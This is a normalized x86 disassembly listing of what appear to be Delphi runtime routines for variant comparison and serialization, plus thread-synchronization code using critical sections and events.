mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41311c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
push ebp
call sub_41cf3c
pop ecx
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c9b4
sub_41cfd4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41d04f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_404cf4
sete bl
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_412b44
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404cf4
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d056
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
sub_41d05c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41d0bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_412b44
push ebp
call sub_41cfd4
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d0c3
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41dfb0
sub_41d0e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d1cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404480
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404480
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1d6
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_40442c
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404730
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41d0c8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4047a4
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41d0e0
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4047a4
jmp r-xdata
sub_41d208
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x28 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40873c
test al al
jne r-xdata
mov al 0x1
sub_41d250
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4127d0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41d208
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41d2b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d4c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4127d0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push ebp
call sub_41d250
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4cf
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404450
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_41e064
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4044c4
xor eax eax
push ebp
push sub_41d444
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404688
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4047a4
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ca60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_404480
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4127d0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
push ebp
call sub_41d250
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41d0e0
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41c87c
jmp r-xdata
sub_41d4e0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41d594
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d59b
lea eax [ ebp - 0x8 ]
call sub_406194
lea eax [ ebp - 0x4 ]
call sub_406194
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413180
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40dacc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41d208
pop ecx
mov ebx eax
sub_41d5b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d6b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_413180
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40dacc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6be
lea eax [ ebp - 0x14 ]
call sub_406194
lea eax [ ebp - 0x10 ]
call sub_40442c
lea eax [ ebp - 0xc ]
call sub_406194
lea eax [ ebp - 0x4 ]
call sub_406194
retn
lea ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413180
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41d4e0
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_41e064
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41d0e0
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41c87c
sub_41d6d4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4130a4
mov ebx [ ebp - 0x8 ]
mov al 0x1
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
call sub_403994
cmp [ ebp - 0x108 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d758
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d7fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4130a4
push ebp
call sub_41d6d4
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d805
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403994
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_404688
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c87c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_41e064
jmp r-xdata
sub_41d80c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41d887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_410edc
mov ebx eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413024
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_410f6c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d88e
lea eax [ ebp - 0x10 ]
call sub_4053ac
retn
sub_41d898
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d8fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_413024
push ebp
call sub_41d80c
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d903
lea eax [ ebp - 0x10 ]
call sub_4053ac
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41da20
sub_41d908
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41d990 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4127d0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push ebp
call sub_41cdc4
pop ecx
jmp r-xdata
push ebp
call sub_41cef0
pop ecx
jmp r-xdata
push ebp
call sub_41d05c
pop ecx
jmp r-xdata
push ebp
call sub_41d2b0
pop ecx
jmp r-xdata
push ebp
call sub_41d758
pop ecx
jmp r-xdata
push ebp
call sub_41d898
pop ecx
jmp r-xdata
push ebp
call sub_41cf8c
pop ecx
jmp r-xdata
push ebp
call sub_41d5b4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4127d0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41da20
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ddf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41122c
test al al
je r-xdata
mov eax ebx
call sub_410ed8
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_40531c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41c858
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_405304
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c940
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_405334
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41dfb0
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de00
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x34 ]
call sub_406194
lea eax [ ebp - 0x30 ]
call sub_40442c
lea eax [ ebp - 0x2c ]
call sub_404b1c
lea eax [ ebp - 0x1c ]
call sub_406194
retn
xor eax eax
push ebp
push sub_41dd9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_411fd4
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41da9e ]
mov eax ebx
call sub_40530c
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c9b4
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_405314
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_40532c
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_41df5c
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_406194
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_40533c
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40dacc
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_41e064
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e064
jmp r-xdata
mov eax ebx
call sub_40531c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41c810
jmp r-xdata
mov eax ebx
call sub_40531c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41c7ec
jmp r-xdata
mov eax ebx
call sub_405324
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41c834
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_40532c
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41df5c
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_41e064
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_41e064
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41dd8c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41dd31
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_418914
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403610
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_404688
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_41df5c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41c0a8
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41c0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd38
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
sub_41dd38
mov eax [ ebp - 0xc ]
call sub_418914
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_41e064
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c0a8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4036c0
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_41de18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41de5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404730
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41de7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de65
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41de7c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4046e4
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c0a8
mov eax esi
call sub_4048dc
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41c0a8
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_41dec4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404828
je r-xdata
mov eax esi
call sub_4046e4
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4046e4
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41c0a8
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
mov dl 0x6
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c0a8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41c0a8
sub_41df5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dfa1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_406610
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41dec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa8
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41dfb0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e056
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4064c0
mov eax [ ebp - 0x8 ]
call sub_4046e4
mov edi eax
mov eax ebx
call sub_404c88
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_41e064
mov eax ebx
call sub_404c88
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41c0a8
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41c0a8
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4046ac
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41dec4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e05d
lea eax [ ebp - 0xc ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_41e078
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call GetCurrentThreadId
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
mov [ ebp - 0x1 ] 0x0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e18e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4161a0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ rw-data ]
call sub_416090
xor eax eax
push ebp
push sub_41e141
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ rw-data ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetEvent
sub_41e1a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41e35c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
